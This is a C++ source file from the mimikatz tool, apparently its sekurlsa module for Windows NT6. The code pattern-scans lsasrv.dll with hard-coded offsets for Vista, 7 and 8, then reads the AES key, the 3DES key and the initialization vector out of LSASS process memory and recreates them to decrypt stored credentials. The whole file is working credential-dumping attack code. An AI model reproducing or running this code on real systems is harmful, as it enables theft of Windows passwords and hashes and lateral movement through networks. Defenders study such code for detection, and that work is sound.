/*	Benjamin DELPY `gentilkiwi`
http://blog.gentilkiwi.com
benjamin@gentilkiwi.com
Licence    : http://creativecommons.org/licenses/by/3.0/fr/
Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "keys_nt6.h"
#include "..\..\global.h"
HMODULE mod_mimikatz_sekurlsa_keys_nt6::hBCrypt = NULL;
PBYTE mod_mimikatz_sekurlsa_keys_nt6::AESKey = NULL, mod_mimikatz_sekurlsa_keys_nt6::DES3Key = NULL;
mod_mimikatz_sekurlsa_keys_nt6::PKIWI_BCRYPT_KEY * mod_mimikatz_sekurlsa_keys_nt6::hAesKey = NULL, * mod_mimikatz_sekurlsa_keys_nt6::h3DesKey = NULL;
BCRYPT_ALG_HANDLE * mod_mimikatz_sekurlsa_keys_nt6::hAesProvider = NULL, * mod_mimikatz_sekurlsa_keys_nt6::h3DesProvider = NULL;

BYTE kiwiRandom3DES[24], kiwiRandomAES[16];

#ifdef _M_X64
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D};
LONG OFFS_WNO8_hAesKey								= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3;
LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D};
LONG OFFS_WIN8_hAesKey								= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3;
LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;
#elif defined _M_IX86
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WNO8_hAesKey								= -(5 + 6 + sizeof(long));
LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long));
LONG OFFS_WNO8_InitializationVector					= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);

BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68};
LONG OFFS_WIN8_hAesKey								= -(2 + 6 + sizeof(long));
LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long));
LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
#endif

bool mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData()
{
	if(!hBCrypt)
		hBCrypt = LoadLibrary(L"bcrypt");
		
	PBYTE PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
	ULONG SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY;
	LONG OFFS_WNT6_hAesKey, OFFS_WNT6_h3DesKey, OFFS_WNT6_InitializationVector;
	if(mod_system::GLOB_Version.dwBuildNumber < 8000)
	{
		PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
		SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
		OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
#ifdef _M_X64
		if(mod_system::GLOB_Version.dwMinorVersion < 1)
		{
			OFFS_WNT6_h3DesKey = OFFS_WN60_h3DesKey;
			OFFS_WNT6_InitializationVector = OFFS_WN60_InitializationVector;
		}
		else
		{
			OFFS_WNT6_h3DesKey = OFFS_WN61_h3DesKey;
			OFFS_WNT6_InitializationVector = OFFS_WN61_InitializationVector;
		}
#elif defined _M_IX86
		OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
		OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
#endif
	}
	else
	{
		PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN8_LsaInitializeProtectedMemory_KEY;
		SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
		OFFS_WNT6_hAesKey = OFFS_WIN8_hAesKey;
		OFFS_WNT6_h3DesKey = OFFS_WIN8_h3DesKey;
		OFFS_WNT6_InitializationVector = OFFS_WIN8_InitializationVector;
	}

	PBYTE ptrBase = NULL;
	DWORD mesSucces = 0;
	if(mod_memory::searchMemory(mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr, mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr + mod_mimikatz_sekurlsa::localLSASRV.modBaseSize, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
	{
#ifdef _M_X64
		LONG OFFS_WNT6_AdjustProvider = (mod_system::GLOB_Version.dwBuildNumber < 8000) ? 5 : 4;
		PBYTE InitializationVector = reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
		hAesKey			= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
		h3DesKey		= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_h3DesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey));
		hAesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
		h3DesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
#elif defined _M_IX86
		PBYTE InitializationVector = *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
		hAesKey			= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
		h3DesKey		= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_h3DesKey);
		hAesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_hAesKey + sizeof(PVOID) + 2);
		h3DesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_h3DesKey + sizeof(PVOID) + 2);
#endif
		if(hBCrypt && LsaInitializeProtectedMemory())
		{
			if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (InitializationVector - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), InitializationVector, 16, mod_mimikatz_sekurlsa::hLSASS))
				mesSucces++;

			KIWI_BCRYPT_KEY maCle;
			KIWI_BCRYPT_KEY_DATA maCleData;

			if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(hAesKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
				if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), mod_mimikatz_sekurlsa::hLSASS))
					if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), mod_mimikatz_sekurlsa::hLSASS))
						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*hAesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data) - 2*sizeof(PVOID), mod_mimikatz_sekurlsa::hLSASS)) // 2 pointeurs internes à la fin, la structure de départ n'était pas inutile ;)
							mesSucces++;

			if(mod_memory::readMemory(mod_mimikatz_sekurlsa::pModLSASRV->modBaseAddr + (reinterpret_cast<PBYTE>(h3DesKey) - mod_mimikatz_sekurlsa::localLSASRV.modBaseAddr), &ptrBase, sizeof(PBYTE), mod_mimikatz_sekurlsa::hLSASS))
				if(mod_memory::readMemory(ptrBase, &maCle, sizeof(KIWI_BCRYPT_KEY), mod_mimikatz_sekurlsa::hLSASS))
					if(mod_memory::readMemory(maCle.cle, &maCleData, sizeof(KIWI_BCRYPT_KEY_DATA), mod_mimikatz_sekurlsa::hLSASS))
						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), mod_mimikatz_sekurlsa::hLSASS))
							mesSucces++;
		}
		else (*outputStream) << L"LsaInitializeProtectedMemory NT6 KO" << endl;
	}
	else (*outputStream) << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 

	return (mesSucces == 3);
}


bool mod_mimikatz_sekurlsa_keys_nt6::uninitLSASSData()
{
	if(hBCrypt)
	{
		LsaCleanupProtectedMemory();
		FreeLibrary(hBCrypt);
	}
	return true;
}

bool mod_mimikatz_sekurlsa_keys_nt6::LsaInitializeProtectedMemory()
{
	bool resultat = false;

	PBCRYPT_OPEN_ALGORITHM_PROVIDER K_BCryptOpenAlgorithmProvider = reinterpret_cast<PBCRYPT_OPEN_ALGORITHM_PROVIDER>(GetProcAddress(hBCrypt, "BCryptOpenAlgorithmProvider"));
	PBCRYPT_SET_PROPERTY K_BCryptSetProperty = reinterpret_cast<PBCRYPT_SET_PROPERTY>(GetProcAddress(hBCrypt, "BCryptSetProperty"));
	PBCRYPT_GET_PROPERTY K_BCryptGetProperty = reinterpret_cast<PBCRYPT_GET_PROPERTY>(GetProcAddress(hBCrypt, "BCryptGetProperty"));
	PBCRYPT_GENERATE_SYMMETRIC_KEY K_BCryptGenerateSymmetricKey = reinterpret_cast<PBCRYPT_GENERATE_SYMMETRIC_KEY>(GetProcAddress(hBCrypt, "BCryptGenerateSymmetricKey"));

	if(NT_SUCCESS(K_BCryptOpenAlgorithmProvider(h3DesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0)) && 
		NT_SUCCESS(K_BCryptOpenAlgorithmProvider(hAesProvider, BCRYPT_AES_ALGORITHM, NULL, 0)))
	{
		if(NT_SUCCESS(K_BCryptSetProperty(*h3DesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CBC), sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) &&
			NT_SUCCESS(K_BCryptSetProperty(*hAesProvider, BCRYPT_CHAINING_MODE, reinterpret_cast<PBYTE>(BCRYPT_CHAIN_MODE_CFB), sizeof(BCRYPT_CHAIN_MODE_CFB), 0)))
		{
			DWORD DES3KeyLen, AESKeyLen, cbLen;

			if(NT_SUCCESS(K_BCryptGetProperty(*h3DesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&DES3KeyLen), sizeof(DES3KeyLen), &cbLen, 0)) &&
				NT_SUCCESS(K_BCryptGetProperty(*hAesProvider, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PBYTE>(&AESKeyLen), sizeof(AESKeyLen), &cbLen, 0)))
			{
				DES3Key = new BYTE[DES3KeyLen];
				AESKey = new BYTE[AESKeyLen];

				resultat = NT_SUCCESS(K_BCryptGenerateSymmetricKey(*h3DesProvider, (BCRYPT_KEY_HANDLE *) h3DesKey, DES3Key, DES3KeyLen, kiwiRandom3DES, sizeof(kiwiRandom3DES), 0)) &&
					NT_SUCCESS(K_BCryptGenerateSymmetricKey(*hAesProvider, (BCRYPT_KEY_HANDLE *) hAesKey, AESKey, AESKeyLen, kiwiRandomAES, sizeof(kiwiRandomAES), 0));
			}
		}
	}
	return resultat;
}

bool mod_mimikatz_sekurlsa_keys_nt6::LsaCleanupProtectedMemory()
{
	PBCRYTP_DESTROY_KEY K_BCryptDestroyKey = reinterpret_cast<PBCRYTP_DESTROY_KEY>(GetProcAddress(hBCrypt, "BCryptDestroyKey"));
	PBCRYTP_CLOSE_ALGORITHM_PROVIDER K_BCryptCloseAlgorithmProvider = reinterpret_cast<PBCRYTP_CLOSE_ALGORITHM_PROVIDER>(GetProcAddress(hBCrypt, "BCryptCloseAlgorithmProvider"));

	if (h3DesKey )
		K_BCryptDestroyKey(*h3DesKey);
	if (hAesKey )
		K_BCryptDestroyKey(*hAesKey);

	if (h3DesProvider)
		K_BCryptCloseAlgorithmProvider(*h3DesProvider, 0);
	if (hAesProvider )
		K_BCryptCloseAlgorithmProvider(*hAesProvider, 0);

	if(DES3Key)
		delete[] DES3Key;
	if(AESKey)
		delete[] AESKey;

	return true;
}